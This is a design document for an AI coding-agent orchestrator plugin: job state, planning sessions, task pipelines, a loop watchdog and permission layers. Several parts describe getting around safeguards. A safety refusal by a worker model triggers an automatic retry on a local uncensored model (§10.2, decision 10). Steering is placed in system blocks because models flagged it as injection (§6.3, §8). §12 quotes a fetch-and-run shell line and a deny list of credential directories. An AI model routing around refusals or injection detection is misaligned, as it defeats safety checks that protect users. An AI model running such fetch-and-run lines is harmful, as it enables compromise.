# micromanager design: job state, planning session, Jev's decision tree

Status (2026-10-04): design agreed, Phase A spikes done (§17), extended the same day by local vs cloud routing, censored vs uncensored
guards, decision backends (cloud Jev or local GLiNER) and user overrides (§19–§22). Implementation follows in the phases listed in [plan.md](plan.md). The flow
chart [design.html](design.html) is the interactive version of this document. It shows where Jev decides and
where skills and tools are picked and used.

What exists today:
- the role matrix (`src/roles.ts`),
- model routing on the built-in `subagent` call (`src/routing.ts`, `src/hooks.ts`),
- the Jev client (`src/jev.ts`),
- Jev on permission requests (`src/decide.ts`),
- the decision journal (`src/journal.ts`).

Everything else in this document is design.

## 1. Why the redesign
The micromanager is a system prompt plus two hooks. Its plan lives only inside the LLM's context: there is no goal,
complexity, task list, dependency graph or progress that code or Jev could see. So Jev can decide permissions,
but not:
- whether the job is clear,
- how it is split,
- which tasks run in parallel,
- which tools, skills and loops a task gets.

The redesign follows the jev-tutor engine (`../jev-tutor/src/jev_tutor/engine/state.py`, `agenda.py`,
`decisions.py`, `decision/rules.py`):
- a persisted state and explicit FSMs with `ALLOWED` tables, so an illegal jump throws;
- a deterministic agenda that builds candidate next steps; Jev chooses among them; a rules fallback takes the
  first candidate;
- deterministic shortcuts on exact phrases before any Jev call;
- code owning every threshold. Jev only chooses among candidates code has built.

Decisions (user, 2026-10-03/04):
1. **The plugin drives the loop.** LLMs write text: questions, plans, code, reviews, summaries.
2. **The main session never executes a task.** It talks, plans through a subagent, and delegates.
3. **Planning by discussion.** If the job is unclear, a planning session discusses it with the user:
   - one question at a time,
   - no suggested answers.
4. **Tasks are split as small as possible**, so cheap models can do them.
5. **No worker can loop forever.** A watchdog in code ends it.
6. **Every Jev decision is recorded** in a form a local Jev (Open-Jev) can be trained on.
7. **Caveman-style terse text** is used wherever only machines read it.
8. **Worker starts stay confirmed:** Jev first, then the user (decision 2026-10-01). Starts are confirmed per
   batch, not per worker.
9. **Models: local when capable** (4060 GPU, iGPU; the NPU is reserved for Whisper and one small quick model). Cloud (OpenCode Go) is used for hard tasks, long contexts,
   or when the local hardware is busy (§19).
10. **A legitimate task a censored model would refuse** goes automatically to a local uncensored model. Only a
    narrowly defined `harmful` and `injection` go to the user (§21).
11. **Local check first.** GLiNER, a local decision model, can replace TypeSafe Jev. A shadow mode runs both, and
    GLiNER is retrained on Jev's answers (§20).
12. **Every decision can be made by the decision model, or set or skipped by the user** (§22).

## 2. Principles
1. **Code owns state, transitions and thresholds.** Jev picks among code-built candidates. LLMs only write.
2. **"Done" is grounded outside the model:** exit codes, frozen tests, diffs. A worker saying "done" is never
   proof. An LLM review counts only with evidence (file:line, a command and its result).
3. **Every worker starts with a fresh context**, briefed by code. The job state holds the memory, not chat
   history.
4. **Every loop has a hard cap** and separate exits for done, blocked and budget.
5. **The reviewer comes from another model family** than the writer (`family()` in `src/roles.ts`).
6. **Effort scales with complexity.** Trivial tasks skip planning and review.
7. **Without Jev:** rules decide routing and flow; the user decides permissions. Nothing is decided on a guess.
8. **Start small.** A node, pipeline or plugin outside the MVP (§16) is switched on only when the journal and
   the eval harness show the need.

## 3. Roles of the sessions
| Session | Runs on | Does | Never |
|---|---|---|---|
| micromanager (main) | the session model the user chose (`facilitatorModel` in the config; may be local) | talks with the user, runs the planning session, shows checkpoints, writes the final summary | edit, write, patch, shell, web (denied by its rules); reading beyond short orientation (README, file list; a read cap in the evaluate hook) |
| planner (subagent, role `plan`) | routed | writes spec, seams and tasks as JSON | code |
| workers (roles explore … oracle) | routed per task | one task each, in a worktree when they write | start sub-agents (`subagent` denied) |
| plugin code | — | state, agenda, gates (runs Verify commands itself), merges, watchdog, journal | decide anything a Jev floor or the user owns |

## 4. Job state
The job file `<project>/.jev-micromanager/jobs/<id>.json` is the single source of truth (Phase B, `src/store.ts`).
It is written atomically, readable by the user and the flow pages, and kept out of git through
`.git/info/exclude`. `ctx.storage` was not used: its API was not verified in Phase A, and a file needs no
second copy.

```jsonc
{
  "id": "job-2026-10-03-a1",
  "goal": "Add CSV export to the report CLI, with tests and docs",
  "phase": "planning_session",
  "triage": { "complexity": 5, "mode": "plan", "confidence": 0.88 },
  "designTree": { "...": "see §6.2" },
  "decisions": [{ "id": "D1", "text": "flag --csv on report", "origin": "user" }],
  "seams": ["report CLI invocation -> CSV file"],
  "acceptance": [{ "id": "A1", "text": "`report --csv out.csv` writes all rows", "verify": "npm test -- csv" }],
  "facts": { "verified": ["CLI entry src/cli.ts"], "toLookup": ["F1"], "guesses": [] },
  "integrationBranch": "jev/job-2026-10-03-a1",
  "budget": { "workersMax": 6, "workersUsed": 1, "parallelMax": 3, "turnsMax": 40, "replansMax": 2,
              "requestsMax": 200, "tokensMax": 2000000, "costCap": null },
  "counters": { "turns": 4, "stalls": 0, "replans": 0, "questionsAsked": 3 },
  "tasks": [{
    "id": "T1", "title": "CSV writer (tracer bullet: flag -> file)", "acceptance": ["A1"],
    "dependsOn": [], "files": ["src/csv.ts", "test/csv.test.ts"], "wave": 1, "parent": null,
    "status": "pending",
    "classification": { "role": "code", "difficulty": 0.4, "risk": "internal", "hasTestOracle": true,
                        "confidence": { "role": 0.93, "risk": 0.81 } },
    "profile": { "model": "opencode-go/glm-5.3-flash", "budgetTier": "M",
                 "tools": { "shell": "ask", "web": "deny", "symbol_nav": true, "papers": false },
                 "skills": ["tdd", "typescript-patterns", "verification-before-completion"],
                 "permissions": "normal", "outputStyle": "caveman" },
    "pipeline": { "id": "P3", "caps": { "fix": 2, "review": 3 } },
    "stages": [], "notes": ".jev-micromanager/notes/job-2026-10-03-a1/T1.md",
    "session": null, "worktree": null, "baseSha": null, "headSha": null,
    "attempts": 0, "modelSwitches": 0, "signatures": []
  }],
  "lessons": []
}
```
- **ready** (derived by code): pending, and every dependency passed.
- **parallel-safe** (derived by code): disjoint `files`, read-only, or separate worktrees.
- **On a hub restart**, `reconcile` maps running sessions back to tasks: wait on them, or mark them stale. A
  planning session resumes at `designTree.current` and never asks again what is settled.

## 5. State machines
**Job:**
```
intake → triage → clarity ─┬─ clear ───────────────────────────────┐
                           └─ open → planning_session → design_checkpoint
design_checkpoint ─ confirm → plan → plan_gate (user) → execute
execute ⇄ replan        execute → verify → integrate (user) → wrap → done
any → paused | stopped | failed       ask_user from any state, back to the previous one
```

**Task:**
```
pending → ready → planned → running → gating → reviewing → passed → merged
                               ▲          │fail        │fail
                               └── fixing ◄┴───────────┘
fixing → escalated → running | replan | cancelled
any → blocked (NEEDS_CONTEXT / BLOCKED, waits for an answer) | cancelled
```
`planned` means classified, profiled, and with a pipeline chosen.

## 6. Planning session
### 6.1 When
- **N1 triage** scores complexity (1–10) and the mode: solo, plan or backlog.
- **N2 clarity** asks Jev, per design question, whether it is already settled by the job text, the code or
  earlier decisions.
- **Gate:**
  - skip the session if every question with impact ≥ medium is settled and `user_must_decide` is below its
    floor;
  - solo jobs (complexity ≤ 3) skip it unless an open question only the user can answer exists.

### 6.2 The design tree
The tree is owned by code, after mattpocock `grilling`. The facilitator drafts it. Code validates it:
- ids are unique,
- there are no cycles,
- it has at most 25 nodes,
- every node has an impact.

Jev checks `tree_covers_job` before the first question.

```jsonc
"designTree": {
  "nodes": [
    { "id": "D1", "question": "Where does the CSV export live: a CLI flag or a separate command?",
      "kind": "decision", "dependsOn": [], "impact": "high", "status": "settled",
      "answer": "flag --csv on report", "origin": "user",
      "reasoning": "one entry point; scripts already call report", "settledAt": "turn 3" },
    { "id": "F1", "question": "Does the project already have a CSV dependency?", "kind": "fact",
      "status": "researching", "task": "explore-7" },
    { "id": "D2", "question": "How are fields with commas quoted?", "kind": "decision",
      "dependsOn": ["D1"], "impact": "medium", "status": "open" }
  ],
  "frontier": ["D2"],
  "current": "D2",
  "depth": "normal"
}
```
- `kind`: decision (the user's) | fact (agents look it up) | assumption.
- `status`: open | discussing | settled | assumed | out_of_scope | researching.
- `origin`: user | proposed_and_confirmed | fact.
- **frontier**: the open decisions whose prerequisites are all settled.

### 6.3 One question per turn
An answer can change the next question, so the session asks exactly one.

1. **Facts are never asked of the user.** They go to explore and research workers in the background. Only the
   questions that depend on a fact wait for it.
2. **Jev N2b picks the next question** from the frontier. Fallback: highest impact, then most dependents.
3. **The facilitator asks it openly:**
   - context in 1–3 sentences,
   - a **Concept** / **Why this matters** callout when a term is new,
   - **no options and no recommendation**, because people take the suggestion.
4. **The user answers in their own words.**
5. **Jev N2c reads the answer**, all nouls in one call: settles_decision, opens_new_branches, user_stuck,
   user_asks_for_options, contradicts_earlier_decision, out_of_scope, needs_prototype.
   - **settles** → record the answer and the user's reasoning, with origin user.
   - **new branches** → the facilitator adds nodes, and code re-validates the tree.
   - **contradiction** → the facilitator names both statements and asks which holds.
   - **unclear** → one follow-up that challenges assumptions, failure modes or trust boundaries.
   - **stuck or asks** → only now: explain the concept, or show 2–3 approaches with their trade-offs. Then hand
     the decision back ("which would you take, and why?"). Never pick one.
   - **needs_prototype** → a throwaway prototype worker (mattpocock `prototype`, logic branch: a single HTML
     state-machine demo) answers the question before the user decides.
6. **The frontier is recomputed.**

Limits:
- Only nodes with impact ≥ medium are asked. Low-impact ones become `assumed` and show up at the checkpoint.
- Question cap by depth: light 5, normal 12, frequent unlimited. At the cap: a checkpoint with "continue?".

**Shortcuts** (exact phrases, before Jev):
- "stop" / "enough"
- "skip": the node becomes assumed and is shown at the checkpoint
- "wait what" / "I don't get it": the facilitator re-pitches with the missing context
- "go back to D1": reopens a node
- "light" / "normal" / "frequent": sets the depth

**Design checkpoint** (from vibe-wise): the user's decisions, apart from a **Proposed additions** table
(detail / proposal / why). The question form offers Confirm or Discuss.

**Output to the planner:**
- the settled tree, as decisions with their origin;
- the agreed test seams;
- with GLOSSARY.md / docs/adr in the repo: mattpocock `domain-modeling` updates them as decisions settle.

**Very large jobs** (complexity 9–10, later): a wayfinder map, i.e. a destination plus decision tickets, worked
one per session across days.

**Where it runs** (verified, A1): the `session` hook `prompt` sees every user turn (text, files, agents, skills)
before it is processed, and the `context` hook sees every provider turn (system blocks, messages, tools).
- **Steering goes through the system prompt** (the `context` hook appends a system block, e.g. "ask exactly D2
  now") or through `ctx.session.synthetic`. It never goes through the user's text: a note appended to the user
  message was recognised as an injection and ignored (A1).

## 7. Plan and task split
- **The planner subagent** writes the plan as JSON:
  - acceptance points with Verify commands;
  - tasks as vertical tracer-bullet slices (mattpocock `to-tickets`), each with its declared `files`, its
    blocking edges and its acceptance points;
  - wide refactors follow expand–contract.
- **Code validates** the DAG, the files and the acceptance coverage. The user approves the plan.
- **N4 splits every task until it is small:**
  - difficulty ≤ small,
  - it fits one fresh context,
  - it stays verifiable on its own.

  Stop rules:
  - at most 2 split levels,
  - no slice without its own acceptance point,
  - no split whose only effect is coordination overhead.

  The planner writes the subtasks (T3.1, T3.2); code re-validates.
- **Why small:** the model is chosen per role × needs × **difficulty tier** (`tiers` in the config). Today the
  three tiers are all flash models; local models and any stronger model slot in as tiers later.

## 8. The task loop (tick)
**When it runs:** on every event (a worker goes idle or fails, a gate finishes, the user answers, a timer fires,
a `/micromanager` command).

**What it does:** reconcile → build the agenda → decide → act → journal.

**Agenda** (deterministic priority order):
1. answer a blocked worker
2. handle a failed gate
3. gate a finished worker
4. review a gated task
5. dispatch ready tasks
6. replan when stalled
7. verify
8. ask the user
9. wrap

Ready tasks are ordered: in-progress parent first, then priority, then fewer dependencies, then id.

**Decision:** Jev picks among the proposals. Below the floor, or without Jev, the first proposal wins.

**The task queue (Phase E).** Tasks carry a priority (1 to 5, from the planner, or from N7 for found work) and an
origin (plan, split, discovered, replan). Among ready tasks, priority comes first. The queue grows while it runs:
- **Workers report `FOLLOWUP: what | why | files`** for work the job needs outside their task; reviewers report
  it as `outside`. The brief lists the job's other open tasks, so planned work is not reported again.
- **N7, one request per report**, asks per item: needed for the acceptance points, in scope, already covered by
  another task, the user's call, and its priority.
  - Needed or in scope: code builds a task after its finder, with its own acceptance point, and re-validates the
    graph. The item first passes G0 like a goal.
  - Already planned: dropped.
  - Everything else, or anything over the cap (half the planned tasks, at least 3): the job's "later" list,
    shown at the end.
- **Without Jev:** an item on files of tasks still open is already planned, and one on files of done tasks is in
  scope.

**Background runs (Phase E).**
- `run_job` queues the job with a scheduler in the plugin and returns at once.
- **Updates.** Progress goes to the micromanager's session as quiet synthetic messages (no new turn). When a job ends
  or needs the user, a synthetic message with `resume` wakes the micromanager. The update itself goes in as a system
  block, because a Phase E spike showed that models take synthetic text for an injection. `notify-send` adds a
  desktop notification.
- **Stop and resume.** `stop_job` interrupts the running worker and pauses the job. `run_job` with the
  user's answer as a note resumes it: the note becomes a decision every later brief carries.

### 8.1 Classification and profile: one Jev request per task (N5 + N5b)
Jev answers many questions in one call, "in parallel and in isolation against the same state". Adding questions
barely changes the latency, and only input tokens are billed.

One request per task asks:
- role (choice of 10)
- difficulty (score)
- risk (choice: cosmetic / internal / public_api / data_security / destructive)
- has_test_oracle, test_first_possible, approach_uncertain, bug_unknown_cause (one noul each)
- `tool.<group>`, one noul each: shell, web, symbol_nav, structural_search, library_docs, papers, memory,
  code_graph
- `skill.<name>`: one noul per catalog skill allowed for the role
- perm_profile (choice: strict / normal / trusted)
- budget_tier (choice: S / M / L)
- injection (noul)

Rules for these requests:
- **Multi-select** is one noul per option, because a choice picks exactly one. Code keeps the options above their
  floor, with at most 3 optional skills.
- **Isolated answers.** No question sees another's answer, so a request asks only independent things. Code
  combines them:
  - model = `chooseModel(role, needs, tier)`;
  - pipeline = rules over the answers (§9).

  A truly dependent decision is a second call.
- **Locality and censorship are not asked here.** The local-first gate G0 (§20) has already set them. The
  model comes from the registry (§19).
- **Consistency.** The role matrix is the upper bound. A contradicting combination (e.g. role explore with a high
  `tool.shell`) is cut to the matrix and lowers the effective confidence.

**The profile narrows the role matrix, never widens it:**
- It is set as the worker session's own permission rules at `ctx.session.create({ permissions })` (A5). A tool
  denied there disappears from the worker's toolset.
- The `evaluate` hook (it fires for allow and ask, not for deny) tightens single requests on top, through a
  session → task map.
- **Profiles deny tool groups, never single tools.** A2 showed a worker without `read` reading the file through
  `grep`. Reading = read, grep, glob, list, lsp; writing = edit, write, patch; and so on.

**Rule-based additions** (no Jev):
- verification-before-completion for every writer;
- modern-python / typescript-patterns by project files;
- shell-strategy instructions for code, test and debug;
- caveman output style for every worker whose output only machines read.

### 8.2 Brief in, report out (the idea of mattpocock `handoff`, done by code)
- **Brief**, written by code, with pointers rather than copies:
  - task, acceptance and seams (verbatim),
  - the decisions that apply,
  - the paths of earlier notes, the diff range, and lessons,
  - the skills to load.

  It uses plain instructions, no caveman.
- **Report**, written by the worker in caveman style. Code parses it into the task state, and the full text goes
  to `<project>/.jev-micromanager/notes/<job>/<task>.md`. Fields:
  - status: DONE / DONE_WITH_CONCERNS / NEEDS_CONTEXT / BLOCKED,
  - changed files, evidence, open issues, pointers,
  - `FOLLOWUP` lines (Phase E): work outside the task, for N7.
- **Where the notes live.** The notes directory sits inside the project, so no `external_directory` ask is
  triggered, and the plugin adds it to `.git/info/exclude`.
- **Handoff note.** On a fresh session after a failure, a model switch, an interrupt or a resumed job, code
  builds a handoff note:
  - what was read and done,
  - what failed and why,
  - where to continue,
  - suggested skills.

  Secrets are redacted.

## 9. Pipelines: which loops a task passes (N6)
| ID | Stages | Selected when | MVP |
|---|---|---|---|
| P0 direct | implement → gate (lint) | cosmetic, 1 file | flag |
| P1 gated | implement → gate, fix ≤ 2 | small, clear, a test oracle exists | yes |
| P2 PDCA | implement → gate → review (standards ∥ spec, other family), ≤ 3 rounds | risk ≥ public_api, or no oracle | yes |
| P3 TDD | seams → red (frozen) → green → gate → review | test_first_possible and (bug or risk ≥ public_api) | yes |
| P4 planned | explore → plan review → fan out P1–P3 | approach uncertain or > 5 files | flag |
| P5 Ralph | a fresh worker per backlog item; the gate is the backpressure; cap items × 1.5; plan regenerated on drift | backlog mode with a test oracle | flag |
| P6 debug | red-capable feedback loop → hypothesis → fix → regression test; 3 failed fixes → oracle | bug with unknown cause | flag |
| P7 fan-out | worktrees → a pipeline each → merge train | disjoint files | flag (parallel readers from day one) |
| P8 best-of-N | N families → tests decide | an escalation step, cheap to verify | flag |
| P9 research | 1 / 2–4 / 5+ readers → synthesis → citation check | read-only | yes |

- Low confidence on the pipeline means one tier up (P1 → P2).
- Modifiers:
  - `+visual` with needs.vision,
  - `+oracle` with risk ≥ data_security,
  - `+user_confirm` for destructive or external effects.
- **The gate is run by the plugin** (`ctx.shell` in the worktree, in the project directory inside it — §11).
- **Three ways a task could merge having verified nothing, all closed 2026-10-07:**
  1. *No checks.* An empty check array yielded no failures, which read as success. A writer now needs at least one
     check; a reader has none and is unaffected.
  2. *A gate that passed over an untouched tree.* A passing gate with an empty diff is reported as unverified rather
     than merged, on both the runner's path and the native `finish_task` path. This is decided against the real diff,
     not the check text: `test -f a.js` reads nothing but fails when the work is missing, and every test runner is a
     "read" as far as `readsOnly` is concerned because it changes no project file. A rule on the check text either
     refused `npm test` or guessed at intent from a command name; it was written, tested and removed, and the reason
     is recorded in `src/plan.ts` so it is not reinvented.
  3. *Failures handed back forever.* The native path had no retry cap, so a check that could not be satisfied in the
     environment — a path that does not exist there, a command the gate refuses — burned a whole session. Both paths
     now stop at `FIX_ROUNDS` (2, the runner's own cap is configurable and uses the same default) and say the check
     is the likely problem, pointing at `steer_task` rather than at a new worker.
- **The gate honours cancellation between checks** (2026-10-07). One check is bounded by its own timeout, because
  there is nothing to interrupt a shell with once it started — but `stop_job` could not stop a job with five checks
  until all five had run. A skipped check is reported as failed with a distinct exit code, so a caller cannot read
  "not run" as "passed".
- **Review** returns JSON. Every finding carries evidence and a confidence. Findings under 80, or without
  evidence, are advisory and do not fail the task.

## 10. Loops, stalls and the watchdog
### 10.1 The loop watchdog (no worker loops forever)
Background: Kimi 2.6/2.7 looped without reading its own answers and restarted its task. Gemini is known for
endless read loops.
- **Live, in code.** The plugin follows each worker session through the `tool.execute.before/after` hooks and the
  `context` hook (A4: the event stream delivered nothing) and interrupts it
  (`ctx.session.interrupt`). The model never decides whether it loops.
- **Limits:** steps, wall clock, tokens.
  - Jev picks the budget tier (S / M / L) in N5.
  - Code maps the tier to numbers under hard ceilings from the config.
  - The eval harness calibrates the tiers from real durations.
- **Signatures:**
  - the same tool + args 3× in 10 calls;
  - the same error twice;
  - a read loop: an unchanged file (content hash) read a 3rd time with no edit in between and within a 16-call
    window, or 16 calls in a row without progress;
  - **What counts as progress** (revised 2026-10-07, after a worker was stopped while eight calls into reading a
    source file): a new path, a search (`grep`, `glob`, `ast-grep`, `code_graph`, web fetch), and **a command that ran
    and did not fail** — including `execute`, which opens no path the check could see. Only a command that keeps
    failing counts towards the run, because that is the one case `sameCall` cannot catch: the command text differs
    each time. The old rule counted every shell call that was not one of six recognised write shapes, so `npm test`,
    `git status` and `node --test` all pushed a worker towards a stop. `sameCall` is the signature that actually
    catches a stuck command; counting calls as well only stopped workers verifying their work.
  - The bar was raised from 8 to 16 at the same time: it is a per-call count, and a reader working through one file
    hits a low bar on ordinary work. A reader may opt out entirely with `noNewFiles: 0`.
  - a restart: the opening action sequence repeats (prefix match), or near-duplicate assistant text appears;
  - monologue: 3 replies without a tool call;
  - A/B alternation 6×;
  - repeated context-window errors.
- **After an interrupt** the session is never resumed. N9 starts a fresh one on another family with a handoff
  note.
- **Assumption to check (spike A7):** glm, qwen and deepseek see their own tool output and reasoning through
  OpenCode Go. Losing it is the usual cause of the restart pattern.

### 10.2 Improvement loop and escalation (N8, N9)
- **After each stage, N8 asks:** satisfied, in_loop, making_progress. Hash signatures override Jev:
  - the same diff hash,
  - the same review issues twice,
  - the test count unchanged over 2 rounds.
- **N9 ladder (MVP):**
  1. fix in the same session, ≤ 2 rounds;
  2. a fresh session on another family, with a handoff note: first another local model, then the cloud, but
     never the cloud for a local-only task (§19);
  3. the user, with a typed reason: spec_ambiguous / external_dependency / budget / conflicting_review.

  Later: best-of-2, split, replan.
- **Job level** (Magentic-One): the stall counter goes +1 on a stall and −1 on progress. At 3: replan (facts →
  root cause → new plan), at most 2 times, then the user.
- **Budgets:** workers, requests, tokens, and an optional cost cap. They are checked before every start.

**Implemented (Phase E):**
- **N8.** The same diff hash as the last round ends the fix rounds. So does the same failure, when Jev calls it a
  loop (without Jev, always). The same unmet review points twice skip the remaining review rounds.
- **N9 rung 2** generalizes the watchdog's fresh session: another family, a handoff note with the reason, the
  failures and the changed files.
- **Rung 3 types the reason by Jev (N9):** spec_ambiguous, external_dependency, conflicting_review, too_hard.
  - too_hard does not stop the job: other tasks go on, the stall counter grows, and the agenda replans when
    escalated tasks block the rest, before the user.
  - budget, refused and merge_conflict are typed by code.
- **Budgets.** Every session's usage goes to the job's counters. The config sets limits per job (default 4M tokens,
  800 requests) under hard ceilings. N5's tier also caps tokens per session (S 250k, M 600k, L 1.5M).
- **worker_refused.** A reply without a report that reads like a safety refusal gets one fresh session on a
  local uncensored model. It goes to the user when the gate flagged the job harmful, when no such model is
  available, or after a second refusal.

## 11. Parallelism and merging
- **Waves** come from the DAG. A batch takes only parallel-safe ready tasks: at most 3 per job and 2 per model.
- **Worker starts are confirmed per batch** ("start T1 and T3 in parallel?"): Jev first, the user when Jev is not
  sure.
- **The integration branch:**
  - The job works on the branch `jev/<job>` in its own worktree at `<project>/.jev-micromanager/worktrees/<job>`
    (inside the project, so workers trigger no external_directory ask). The user's checkout is never touched;
    the worktree starts from the last commit, so uncommitted changes of the user are not part of the job.
  - **The offset (`rel`), added 2026-10-07.** Git always materialises a worktree of the *repository root*, so when
    the project is a subdirectory of a larger repository — the live run that found this was a deck three levels below
    its worktree — the worker and its checks land above the project's own files. The offset is computed once with
    `git rev-parse --show-toplevel`, persisted on the job and on each task, and used for the worker's directory, the
    gate's cwd, and the paths a task reports. `changedFiles` resolves it away, so a declared file matches what git
    reported and a change outside the project comes back as a `..` escape that cannot. Uncommitted state in the
    user's checkout is detected at job start and reported: no worker can see it, so a task that needs it cannot pass,
    and the micromanager is told rather than discovering it from a confused worker.
  - Writers get worktrees off the integration branch.
  - The baseline gate runs once per job.
- **Merge train:** one branch at a time; rebase → gate → merge; roll back on failure; a conflict goes back to its
  owner once, then to the user.
- **Integrate:** the micromanager does it through `merge_job` (a fast-forward into the user's checkout, after showing
  what would land and refusing on a dirty checkout or unfinished tasks) or `discard_job`. Both require an explicit
  acknowledgement, list what they remove, and journal it. This is the one write the orchestrator may make in the
  user's working tree; workers never can. Nothing is ever pushed.

**Implemented (Phase F):**
- **Dispatch.** `parallel` (default 3) tasks of a job at the same time, disjoint files only. Turns on one model
  wait for a slot: `perModel` (default 2) per cloud model, 1 per local model.
- **Batch confirmation.** N10 asks Jev whether each new task of a batch is independent of the others. A doubted
  task waits for a later batch, and the user is not asked: nobody sits at a background run.
- **Branches.** Each task works in `.jev-micromanager/worktrees/<job>--<task>` on `jev/<job>--<task>`.
- **The merge train.** Rebase, then the checks again when the job's branch moved, then a fast-forward. A conflict
  sends the task back once, from the newest commit; a second conflict goes to the user.
- **Done means merged.** A task counts as done only once it is merged.

## 12. Permissions (N13)
- **Path of an ask:**
  1. The profile narrows the request in the `evaluate` hook.
  2. cc-safety-net `checkCommand` (hard rule #0).
  3. The hard rules (`.env`, push, sudo, system installs, destructive deletion).
  4. Deleted-path facts from git.
  5. Guards: G0 on the worker's question (§20, §21).
  6. Jev: answer, needs_user, risk, path_relevance.
  7. The floors per risk class × profile.
- **Outcome:** allow / deny / the user, with Jev's guess shown in the question.
- **`external_directory` is layered** (2026-10-07). It used to be a single hard rule — always the user — which made
  any task touching a path outside the project impossible to delegate (live test: a worker blocked on the very first
  `ls -l`). Now: a path inside the job's own worktrees is allowed mechanically; a path the task itself names is
  allowed for a read; everything else goes to the user. `~/.ssh`, `~/.aws`, `~/.config`, `~/.gnupg`, `/etc`, `/usr`,
  the home directory itself and another job's worktree content are refused before all three layers.
- **A shell request that only reads is allowed outright** when every path in it resolves inside the worker's
  worktree, without asking Jev. Reading cannot damage a throwaway checkout, and the worktree already removed the reason
  for the question. This needed the classifier fixed first: `sed`, `awk`, `jq`, `timeout`/`nice`/`nohup` wrappers and
  `git -C <path>` were all unrecognised, and one non-read command in a batch poisoned all of them, so 67 of 185
  worker shell requests in the live run escalated to the user — including `git status` in the worker's own tree.
- **Checks go through the same hard rules** (2026-10-07). A task's `Checks:` lines are model-written strings that
  `runGate` hands to `sh -c`; only a rule about backticks and sentence-shaped text stood between a delegation and
  `curl http://x | sh`. Every check is now validated with `hardRule` before the task or its worktree exists.
- **Isolation fails loud** (2026-10-07). A session that is a child of a micromanager session but is not a claimed
  worker has its write tools denied and is journalled. This exists because the delegation guard used to match on the
  *calling agent*: the agent is a property of the session, so switching the session's agent silently skipped every
  later delegation. Ten workers ran unwatched in the user's checkout — no task, no worktree, no checks, no error. A
  delegation is now recognised by its **target** (a `subagent` call aimed at one of this plugin's role agents), and
  the backstop holds whatever the delegation path does.
- **Sessions the runner starts never ask the user directly** (Phase D live tests): nobody sits at a worker's
  session, headless or in the TUI. A request outside its directory is denied; any outcome "the user" becomes a
  deny that tells the worker to report NEEDS_CONTEXT, and the job asks the user in the micromanager's session.
- **Implemented today** in `src/decide.ts` and the plugin's evaluate hook, with the profile's narrowing; without
  cc-safety-net.

## 13. Stack
Checked against OpenCode v2.0.18 on 2026-10-03. v2 does not load v1 plugins. v2-native plugins import
`@opencode/plugin` and default-export `{ id, setup }`.

| Item | Kind | Where | Status |
|---|---|---|---|
| loop watchdog, decision dataset | our code | every worker, every Jev question | must |
| model registry + availability | our code over llama-swap `:8000` (4060), llama-vulkan `:8092` (iGPU), FLM `:52625` (NPU), OpenCode Go | routing (§19) | must |
| decision server (GLiNER2) | our small Python service, Jev wire format, on the CPU | G0, guards, shadow mode (§20) | must |
| Open-Jev server | `openjev` backend, Jev wire format | optional local backend (§20) | later |
| cc-safety-net | plugin (dual, `./opencode/v2`) | N13 hard rule #0 inside our hook (assumption: the import resolves from the symlinked plugin, spike A6; else its own plugin) | must |
| shell-strategy | instructions file | system prompt of code, test, debug | must |
| Serena | MCP | explore, code, debug, review (`tool.symbol_nav`) | must |
| context7 | MCP | research, code, debug (`tool.library_docs`) | must |
| ast-grep | MCP | explore, review, debug (`tool.structural_search`) | should |
| papers | skill: arXiv / OpenAlex query URLs via webfetch | research | should; port `opencode-research-papers` (v1) only if needed |
| Dynamic Context Pruning | plugin (dual) | long worker sessions | later |
| opencode-agent-memory | plugin (v2) | project facts, lessons; until then the lessons in the job files | later |
| opencode-plugin-otel | plugin (v2) | cost per task | later |
| graphify | CLI / skill | explore, oracle | later |
| plannotator | plugin (v1, port) | design checkpoint | later |
| magic-context, opencode-mem, honcho | plugins | conflict with DCP or our agent transform; heavy or cloud | no |
| mission-control, ensemble, swarm, worktree, workspace | plugins | v1, archived or competing orchestrators; ideas only | no |
| phall1/opencode-workflows | plugin (v2) | reference for our v2 code | reference |

### 13.1 Skills
Workflow logic lives in the plugin. Workers only get leaf skills: how to do the work, never how to orchestrate.

| Skill | Source | Role / stage | Loaded |
|---|---|---|---|
| deliberate | ours (vibe-wise `learn` + mattpocock `grilling`) | micromanager, planning session | N2 finds open questions |
| domain-modeling | mattpocock | micromanager | the repo has GLOSSARY / ADR |
| prototype (logic) | mattpocock | a plan worker | N2c `needs_prototype` |
| to-spec, to-tickets | mattpocock, as planner rules | planner | plan mode |
| research | mattpocock | research | research tasks |
| tdd | mattpocock | code, test | P3 |
| diagnosing-bugs | mattpocock | debug | P6 |
| code-review (two axes) | mattpocock | review | P2–P4 |
| verification-before-completion | obra/superpowers | every writer | rule |
| receiving-code-review | obra/superpowers | code | fix rounds |
| modern-python, typescript-patterns | opencodeskills.dev | code, test | rule, by project files |
| git-commits, technical-writing | opencodeskills.dev | write | Jev |
| playwright-e2e | opencodeskills.dev | visual, test | Jev |
| differential-review, insecure-defaults | opencodeskills.dev | review | risk ≥ data_security |
| writing-for-agents | mattpocock | us, while writing prompts and skills | dev time |

- **Not used:**
  - superpowers subagent-driven-development / executing-plans / dispatching-parallel-agents, and mattpocock
    implement-spec: they make a worker orchestrate.
  - brainstorming and grill-me: they recommend answers.
  - handoff as is: code builds our handoff notes (§8.2).
- **Vendoring:**
  - Adapted copies go into `skills/`, with the source commit in their frontmatter and the licence checked per
    source.
  - The parts of mattpocock's skills that point to his issue-tracker setup are removed.
  - `install.sh --skills` links them.
- **Catalog:** from `ctx.skill`.

### 13.2 Caveman: terse text where no human reads it
| Channel | Style |
|---|---|
| worker reports, explore / research notes, review JSON, handoff notes | caveman: answer first, no ceremony, negations kept, payload verbatim |
| briefs (instructions to a flash model) | plain and short; acceptance and seams verbatim |
| Jev state | terse facts; caveman only after the eval harness shows no calibration loss |
| planning session, checkpoints, permission questions, final summary | normal prose |
| code, comments, docs, commits, `docs/research/` notes | normal (caveman's own exception) |

It is applied as a short section in the worker's system prompt, by audience, not as a loaded skill.

### 13.3 Research
- **Tools:** the research role uses webfetch / websearch, the papers skill and context7. The `research` skill
  makes it work against primary sources and cite every claim.
- **P9:** 1, 2–4 or 5+ parallel readers by complexity, then a synthesis worker, then a citation check by code.
- **Output:** `docs/research/<slug>.md` in prose, and a caveman summary in the job state.

## 14. All Jev nodes
| # | Node | Jev answers | Fallback |
|---|---|---|---|
| N1 | triage | complexity, mode, read_only | complexity ≤ 3 → solo |
| N2 | clarity | settled per design question, user_must_decide, tree_covers_job | high-impact questions count as open |
| N2b | next question | choice among the frontier | impact, then dependents |
| N2c | answer reading | settles, new_branches, stuck, asks_options, contradicts, out_of_scope, needs_prototype | the facilitator asks whether it is settled |
| N3 | plan gate | accept / revise / oracle | the user approves (flag) |
| N4 | split | splittable, difficulty, fits_one_context | split when difficulty > small or > 3 files |
